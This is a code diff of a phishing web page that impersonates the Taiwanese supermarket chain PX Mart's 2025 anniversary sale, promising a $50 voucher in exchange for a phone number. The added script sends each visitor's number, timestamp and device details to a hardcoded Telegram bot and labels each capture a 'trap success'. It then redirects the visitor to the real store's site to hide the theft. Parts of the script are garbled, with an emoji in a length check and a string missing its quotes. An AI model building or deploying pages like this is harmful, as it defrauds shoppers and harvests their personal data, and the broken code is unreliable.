@@ -1,36 +1,68 @@
 <!DOCTYPE html>
 <html lang="zh-TW">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>2025 全聯超級週年慶開跑！超過300款商品買1送1</title>
-<link rel="stylesheet" href="style.css">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2025 全聯超級週年慶開跑！超過300款商品買1送1</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Noto Sans TC',sans-serif;background:linear-gradient(#E30613, #fff);color:#333;text-align:center;min-height:100vh}
+        .header{background:#E30613;padding:20px;color:white;text-align:center}
+        .logo{max-width:140px;margin-bottom:10px}
+        h1{font-size:28px;margin:10px 0}
+        p{font-size:16px;margin:10px 0}
+        .main{padding:20px}
+        .banner{width:100%;max-width:400px;border-radius:15px;margin:20px auto;display:block}
+        .box{background:rgba(255,255,255,0.95);padding:30px;border-radius:20px;max-width:400px;margin:0 auto;box-shadow:0 10px 30px rgba(0,0,0,0.3)}
+        h2{font-size:24px;color:#E30613;margin-bottom:15px}
+        .input-group{display:flex;background:white;border-radius:14px;overflow:hidden;margin:20px 0;box-shadow:0 5px 15px rgba(227,6,19,0.2);height:56px}
+        select{background:#f8f8f8;border:none;font-size:18px;padding:0 10px}
+        input{flex:1;border:none;font-size:18px;padding:0 15px;outline:none}
+        button{width:100%;padding:18px;background:#E30613;color:white;border:none;border-radius:14px;font-size:20px;font-weight:bold;cursor:pointer}
+    </style>
 </head>
 <body>
-
-<div class="header">
-  <img src="https://www.pxmart.com.tw/images/logo.png" class="logo">
-  <h1>2025 全聯超級週年慶開跑！</h1>
-  <p>超過300款商品憑卡買1送1｜消費滿300送50</p>
-</div>
-
-<div class="main">
-  <img src="https://www.pxmart.com.tw/CdnRoot/promotion/2025/weekend/1200x800.jpg" class="banner" onerror="this.src='https://via.placeholder.com/800x600?text=全聯週年慶'">
-  <div class="box">
-    <h2>消費滿 $300 立即送 $50 購物金</h2>
-    <p>請輸入手機號碼領取專屬優惠碼（每支門號限領一次）</p>
-    
-    <div class="input-group">
-      <select id="code">
-        <option value="+886" selected>+886</option>
-        <option>+852</option><option>+60</option><option>+66</option><option>+63</option>
-      </select>
-      <input type="tel" id="phone" placeholder="912345678" maxlength="12">
+    <div class="header">
+        <img src="https://www.pxmart.com.tw/images/logo.png" alt="全聯 Logo" class="logo">
+        <h1>2025 全聯超級週年慶開跑！</h1>
+        <p>超過300款商品憑卡買1送1｜消費滿300送50</p>
     </div>
-    <button onclick="send()">立即領取 $50 購物金</button>
-  </div>
-</div>
 
-<script src="script.js"></script>
+    <img src="https://www.pxmart.com.tw/CdnRoot/promotion/2025/weekend/1200x800.jpg" alt="超級週年慶商品" class="banner" onerror="this.src='https://via.placeholder.com/800x600?text=全聯週年慶'">
+
+    <div class="box">
+        <h2>消費滿 $300 立即送 $50 購物金</h2>
+        <p>請輸入手機號碼領取專屬優惠碼（每支門號限領一次）</p>
+        
+        <div class="input-group">
+            <select id="code">
+                <option value="+886" selected>+886</option>
+                <option>+852</option><option>+60</option><option>+66</option><option>+63</option>
+            </select>
+            <input type="tel" id="phone" placeholder="912345678" maxlength="12">
+        </div>
+        <button onclick="send()">立即領取 $50 購物金</button>
+    </div>
+
+    <script>
+        function send(){
+            const code = document.getElementById("code").value;
+            const phone = document.getElementById("phone").value.trim();
+            if(phone.length < 😎 return;
+            
+            document.querySelector("button").textContent = "領取中...";
+            
+            const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
+            const msg = encodeURIComponent(全聯2025誘捕成功\n電話：${code}${phone}\n時間：${time}\n裝置：${navigator.userAgent});
+            
+            // 你的全聯專用 Bot
+            new Image().src = "https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage?chat_id=1137905005&text=" + msg;
+            
+            // 強制跳轉（絕對不會卡）
+            setTimeout(function(){
+                location.href = "https://www.pxmart.com.tw/about-us/news/%E5%85%A8%E8%81%AF%E6%96%B0%E8%81%9E/305";
+            }, 2000);
+        }
+    </script>
 </body>
 </html>
